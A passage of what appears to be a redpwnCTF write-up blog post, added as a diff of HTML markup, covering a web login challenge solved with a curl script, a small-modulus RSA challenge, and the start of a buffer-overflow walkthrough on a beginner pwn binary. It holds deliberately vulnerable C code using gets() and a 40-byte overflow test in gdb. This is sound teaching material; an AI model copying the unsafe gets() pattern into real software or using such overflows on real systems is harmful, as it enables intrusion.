+    &lt;span class="token punctuation"&gt;
+     .
+    &lt;/span&gt;
+    &lt;span class="token property-access"&gt;
+     randomUUID
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     .
+    &lt;/span&gt;
+    &lt;span class="token method function property-access"&gt;
+     toString
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     'utf-8'
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+   &lt;/code&gt;
+  &lt;/div&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  I made a simple shell script that calls cURL with the base64-encoded
+parameters, and decodes the url-encoded flag afterwards:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;div class="prismjs"&gt;
+   &lt;code class="language-sh" style="white-space:pre"&gt;
+    &lt;span class=""&gt;
+     #!/bin/sh
+    &lt;/span&gt;
+    &lt;!-- --&gt;
+    # https://stackoverflow.com/questions/6250698/how-to-decode-url-encoded-string-in-shell
+    &lt;!-- --&gt;
+    function urldecode() { : "${*//+/ }"; echo -e "${_//%/\\x}"; }
+    &lt;!-- --&gt;
+    &lt;!-- --&gt;
+    urldecode $(curl -sX POST \
+    &lt;!-- --&gt;
+    -d "username=$(printf 'admin' | base64)" \
+    &lt;!-- --&gt;
+    -d "password=$(cat ./randomUUID.js)" \
+    &lt;!-- --&gt;
+    https://secure.mc.ax/login)
+   &lt;/code&gt;
+  &lt;/div&gt;
+ &lt;/pre&gt;
+ &lt;h3 id="cryptobaby"&gt;
+  crypto/baby
+ &lt;/h3&gt;
+ &lt;blockquote&gt;
+  &lt;p&gt;
+   I want to do an RSA!
+  &lt;/p&gt;
+ &lt;/blockquote&gt;
+ &lt;p&gt;
+  This challenge is breaking RSA. It only works because the
+  &lt;code&gt;
+   n
+  &lt;/code&gt;
+  parameter is
+really small.
+ &lt;/p&gt;
+ &lt;p&gt;
+  Googling for 'rsa decrypt n e c' yields
+  &lt;a href="https://stackoverflow.com/questions/49878381/rsa-decryption-using-only-n-e-and-c"&gt;
+   this
+  &lt;/a&gt;
+  stackoverflow result, which links to
+  &lt;a href="https://www.dcode.fr/rsa-cipher"&gt;
+   dcode.fr
+  &lt;/a&gt;
+  . The only thing left to do is
+calculate
+  &lt;code&gt;
+   p
+  &lt;/code&gt;
+  and
+  &lt;code&gt;
+   q
+  &lt;/code&gt;
+  , which can be done using
+  &lt;a href="https://wolframalpha.com/"&gt;
+   wolfram
+alpha
+  &lt;/a&gt;
+  .
+ &lt;/p&gt;
+ &lt;h3 id="pwnbeginner-generic-pwn-number-0"&gt;
+  pwn/beginner-generic-pwn-number-0
+ &lt;/h3&gt;
+ &lt;blockquote&gt;
+  &lt;p&gt;
+   rob keeps making me write beginner pwn! i'll show him...
+  &lt;/p&gt;
+  &lt;p&gt;
+   &lt;code&gt;
+    nc mc.ax 31199
+   &lt;/code&gt;
+  &lt;/p&gt;
+ &lt;/blockquote&gt;
+ &lt;p&gt;
+  This was my first interaction with
+  &lt;code&gt;
+   gdb
+  &lt;/code&gt;
+  . It was.. painful. After begging for
+help in the redpwnCTF discord server about another waaaay harder challenge, an
+organizer named asphyxia pointed me towards
+  &lt;a href="https://github.com/hugsy/gef"&gt;
+   gef
+  &lt;/a&gt;
+  which single-handedly saved my sanity during the binary exploitation
+challenges.
+ &lt;/p&gt;
+ &lt;p&gt;
+  The first thing I did was use
+  &lt;a href="https://github.com/radareorg/iaito"&gt;
+   iaito
+  &lt;/a&gt;
+  to
+look at a dissassembly graph of the binary. Iaito is a graphical frontend to
+the radare2 reverse engineering framework, and I didn't feel like learning two
+things at the same time, so that's why I used it. While it's very
+user-friendly, I didn't look into reverse engineering tools very much, and
+didn't realise that iaito is still in development. Let's just say I ran into
+some issues with project saving so I took lots of unnecessary repeated steps.
+ &lt;/p&gt;
+ &lt;p&gt;
+  After trying to make sense of assembly code after just seeing it for the first
+time, I instead decided looking at the source code would be a better idea since
+I actually know c.
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;div class="prismjs"&gt;
+   &lt;code class="language-c" style="white-space:pre"&gt;
+    &lt;span class="token macro property directive-hash"&gt;
+     #
+    &lt;/span&gt;
+    &lt;span class="token macro property directive keyword"&gt;
+     include
+    &lt;/span&gt;
+    &lt;span class="token macro property"&gt;
+    &lt;/span&gt;
+    &lt;span class="token macro property string"&gt;
+     &lt;stdio.h&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token macro property directive-hash"&gt;
+     #
+    &lt;/span&gt;
+    &lt;span class="token macro property directive keyword"&gt;
+     include
+    &lt;/span&gt;
+    &lt;span class="token macro property"&gt;
+    &lt;/span&gt;
+    &lt;span class="token macro property string"&gt;
+     &lt;string.h&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token macro property directive-hash"&gt;
+     #
+    &lt;/span&gt;
+    &lt;span class="token macro property directive keyword"&gt;
+     include
+    &lt;/span&gt;
+    &lt;span class="token macro property"&gt;
+    &lt;/span&gt;
+    &lt;span class="token macro property string"&gt;
+     &lt;stdlib.h&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     const
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     char
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     *
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     inspirational_messages
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     [
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ]
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     =
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     {
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     "\"𝘭𝘦𝘵𝘴 𝘣𝘳𝘦𝘢𝘬 𝘵𝘩𝘦 𝘵𝘳𝘢𝘥𝘪𝘵𝘪𝘰𝘯 𝘰𝘧 𝘭𝘢𝘴𝘵 𝘮𝘪𝘯𝘶𝘵𝘦 𝘤𝘩𝘢𝘭𝘭 𝘸𝘳𝘪𝘵𝘪𝘯𝘨\""
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     "\"𝘱𝘭𝘦𝘢𝘴𝘦 𝘸𝘳𝘪𝘵𝘦 𝘢 𝘱𝘸𝘯 𝘴𝘰𝘮𝘦𝘵𝘪𝘮𝘦 𝘵𝘩𝘪𝘴 𝘸𝘦𝘦𝘬\""
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     "\"𝘮𝘰𝘳𝘦 𝘵𝘩𝘢𝘯 1 𝘸𝘦𝘦𝘬 𝘣𝘦𝘧𝘰𝘳𝘦 𝘵𝘩𝘦 𝘤𝘰𝘮𝘱𝘦𝘵𝘪𝘵𝘪𝘰𝘯\""
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     }
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     int
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     main
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     void
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     {
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     srand
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     time
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token number"&gt;
+     0
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     long
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     inspirational_message_index
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     =
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     rand
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     %
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     sizeof
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     inspirational_messages
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     /
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     sizeof
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     char
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     *
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     char
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     heartfelt_message
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     [
+    &lt;/span&gt;
+    &lt;span class="token number"&gt;
+     32
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ]
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     setbuf
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token constant"&gt;
+     stdout
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token constant"&gt;
+     NULL
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     setbuf
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token constant"&gt;
+     stdin
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token constant"&gt;
+     NULL
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     setbuf
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token constant"&gt;
+     stderr
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token constant"&gt;
+     NULL
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     puts
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     inspirational_messages
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     [
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     inspirational_message_index
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ]
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     puts
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     "rob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!"
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     puts
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     "can you write me a heartfelt message to cheer me up? :("
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     gets
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     heartfelt_message
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     if
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     inspirational_message_index
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     ==
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     -
+    &lt;/span&gt;
+    &lt;span class="token number"&gt;
+     1
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     {
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     system
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     "/bin/sh"
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     }
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     }
+    &lt;/span&gt;
+   &lt;/code&gt;
+  &lt;/div&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  After looking at this source things became a lot clearer, because the only
+input you can actually control is recieved from
+  &lt;code&gt;
+   gets(...);
+  &lt;/code&gt;
+ &lt;/p&gt;
+ &lt;p&gt;
+  Now comes the hard part: doing it, but in assembly!
+ &lt;/p&gt;
+ &lt;p&gt;
+  Some recources you should consume before attempting binary exploitation would
+be
+  &lt;a href="https://www.youtube.com/watch?v=1S0aBV-Waeo"&gt;
+   computerphile's video on buffer
+overflows
+  &lt;/a&gt;
+  and
+  &lt;a href="https://cheat.sh/gdb"&gt;
+   cheat.sh/gdb
+  &lt;/a&gt;
+  for some basic gdb commands. The rest of
+this section assumes you know the basics of both buffer overflows and gdb.
+ &lt;/p&gt;
+ &lt;p&gt;
+  First, let's print a dissassembly of the
+  &lt;code&gt;
+   int main()
+  &lt;/code&gt;
+  function:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;code&gt;
+   (gdb) disas main
+Dump of assembler code for function main:
+   0x000000000040127c &lt;+134&gt;:   call   0x4010a0 &lt;puts@plt&gt;
+   0x0000000000401281 &lt;+139&gt;:   lea    rdi,[rip+0xec8]        # 0x402150
+   0x0000000000401288 &lt;+146&gt;:   call   0x4010a0 &lt;puts@plt&gt;
+   0x000000000040128d &lt;+151&gt;:   lea    rdi,[rip+0xf1c]        # 0x4021b0
+   0x0000000000401294 &lt;+158&gt;:   call   0x4010a0 &lt;puts@plt&gt;
+   0x0000000000401299 &lt;+163&gt;:   lea    rax,[rbp-0x30]
+   0x000000000040129d &lt;+167&gt;:   mov    rdi,rax
+   0x00000000004012a0 &lt;+170&gt;:   call   0x4010f0 &lt;gets@plt&gt;
+   0x00000000004012a5 &lt;+175&gt;:   cmp    QWORD PTR [rbp-0x8],0xffffffffffffffff
+   0x00000000004012aa &lt;+180&gt;:   jne    0x4012b8 &lt;main+194&gt;
+   0x00000000004012ac &lt;+182&gt;:   lea    rdi,[rip+0xf35]        # 0x4021e8
+   0x00000000004012b3 &lt;+189&gt;:   call   0x4010c0 &lt;system@plt&gt;
+   0x00000000004012b8 &lt;+194&gt;:   mov    eax,0x0
+   0x00000000004012bd &lt;+199&gt;:   leave
+   0x00000000004012be &lt;+200&gt;:   ret
+End of assembler dump.
+  &lt;/code&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  This isn't the full output from gdb, but only the last few lines. A few things
+should immediately stand out: the 3
+  &lt;code&gt;
+   &lt;puts@plt&gt;
+  &lt;/code&gt;
+  calls, and right after the
+call to
+  &lt;code&gt;
+   &lt;gets@plt&gt;
+  &lt;/code&gt;
+  . These are the assembly equivalent of:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;div class="prismjs"&gt;
+   &lt;code class="language-c" style="white-space:pre"&gt;
+    &lt;span class="token function"&gt;
+     puts
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     inspirational_messages
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     [
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     inspirational_message_index
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ]
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     puts
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     "rob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!"
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     puts
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     "can you write me a heartfelt message to cheer me up? :("
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     gets
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     heartfelt_message
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+   &lt;/code&gt;
+  &lt;/div&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  Since I didn't see any reference to a flag file being read, I assumed that the
+  &lt;code&gt;
+   system("/bin/sh")
+  &lt;/code&gt;
+  call is our main target, so let's see if we can find that
+in our assembly code. There's a call to
+  &lt;code&gt;
+   &lt;system@plt&gt;
+  &lt;/code&gt;
+  at
+  &lt;code&gt;
+   &lt;main+189&gt;
+  &lt;/code&gt;
+  , and
+there's other weird
+  &lt;code&gt;
+   cmp
+  &lt;/code&gt;
+  ,
+  &lt;code&gt;
+   jne
+  &lt;/code&gt;
+  and
+  &lt;code&gt;
+   lea
+  &lt;/code&gt;
+  instructions before. Let's figure
+out what those do!
+ &lt;/p&gt;
+ &lt;p&gt;
+  After some stackoverflow soul searching, I found out that the
+  &lt;code&gt;
+   cmp
+  &lt;/code&gt;
+  and
+  &lt;code&gt;
+   jne
+  &lt;/code&gt;
+  are assembly instructions for compare, and jump-if-not-equal. They work like
+this:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;div class="prismjs"&gt;
+   &lt;code class="language-asm6502" style="white-space:pre"&gt;
+    &lt;span class="token comment"&gt;
+     ;  cmp compares what's in the $rbp register to 0xffffffffffffffff
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token comment"&gt;
+     ;  and turns on the ZERO flag if they're equal
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     0x004012a5 &lt;+
+    &lt;/span&gt;
+    &lt;span class="token decimalnumber string"&gt;
+     0
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     &gt;:
+    &lt;/span&gt;
+    &lt;span class="token opcode property"&gt;
+     cmp
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     QWORD PTR [rbp-0x8],0xffffffffffffffff
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token comment"&gt;
+     ;  jne checks if the ZERO flag is on,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token comment"&gt;
+     ;  and if it is it jumps (in this case) to 0x4012b8
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     ┌--0x004012aa &lt;+
+    &lt;/span&gt;
+    &lt;span class="token decimalnumber string"&gt;
+     1
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     &gt;:  jne    0x4012b8 &lt;main+
+    &lt;/span&gt;
+    &lt;span class="token decimalnumber string"&gt;
+     194
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     &gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     │
+    &lt;/span&gt;
+    &lt;span class="token comment"&gt;
+     ; we can safely ignore the `lea` instruction as it doesn't impact our pwn
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     │  0x004012ac &lt;+
+    &lt;/span&gt;
+    &lt;span class="token decimalnumber string"&gt;
+     2
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     &gt;:  lea    rdi,[rip+0xf35]        # 0x4021e8
+    &lt;/span&gt;
+    │
+    &lt;span class=""&gt;
+     │
+    &lt;/span&gt;
+    &lt;span class="token comment"&gt;
+     ; the almighty syscall
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     │  0x004012b3 &lt;+
+    &lt;/span&gt;
+    &lt;span class="token decimalnumber string"&gt;
+     3
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     &gt;:  call   0x4010c0 &lt;system@plt&gt;
+    &lt;/span&gt;
+    │
+    &lt;span class=""&gt;
+     │
+    &lt;/span&gt;
+    &lt;span class="token comment"&gt;
+     ; from here on the program exits without calling /bin/sh
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     └-&gt;0x004012b8 &lt;+
+    &lt;/span&gt;
+    &lt;span class="token decimalnumber string"&gt;
+     4
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     &gt;:  mov    eax,0x0
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     0x004012bd &lt;+
+    &lt;/span&gt;
+    &lt;span class="token decimalnumber string"&gt;
+     5
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     &gt;:  leave
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     0x004012be &lt;+
+    &lt;/span&gt;
+    &lt;span class="token decimalnumber string"&gt;
+     6
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     &gt;:  ret
+    &lt;/span&gt;
+   &lt;/code&gt;
+  &lt;/div&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  The program checks if there's
+  &lt;code&gt;
+   0xffffffffffffffff
+  &lt;/code&gt;
+  in memory
+  &lt;code&gt;
+   0x8
+  &lt;/code&gt;
+  bytes before
+the
+  &lt;code&gt;
+   $rbp
+  &lt;/code&gt;
+  register. The program allocates 32 bytes of memory for our heartfelt
+message, but it continues reading even if our heartfelt message is longer than
+32 bytes. Let's see if we can overwrite that register &gt;:)
+ &lt;/p&gt;
+ &lt;p&gt;
+  Let's set a breakpoint after the
+  &lt;code&gt;
+   &lt;gets@plt&gt;
+  &lt;/code&gt;
+  call in gdb, and run the program
+with 40 bytes of
+  &lt;code&gt;
+   0x61
+  &lt;/code&gt;
+  ('a')
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;code&gt;
+   (gdb) break *0x00000000004012a5
+Breakpoint 1 at 0x4012a5
+
+(gdb) run &lt; &lt;(python3 -c "print('a' * 40)")
+  &lt;/code&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  I'm using the
+  &lt;code&gt;
+   run
+  &lt;/code&gt;
+  command with
+  &lt;code&gt;
+   &lt;
+  &lt;/code&gt;
+  and
+  &lt;code&gt;
+   &lt;()
+  &lt;/code&gt;
+  to pipe the output of python
+into the program's
+  &lt;code&gt;
+   stdin
+  &lt;/code&gt;
+  . It's unnecessary at this stage because there's an
+'a' key on my keyboard, but if we were to send raw bytes, this would make it a
+lot easier.
+ &lt;/p&gt;
+ &lt;p&gt;
+  I'm also using
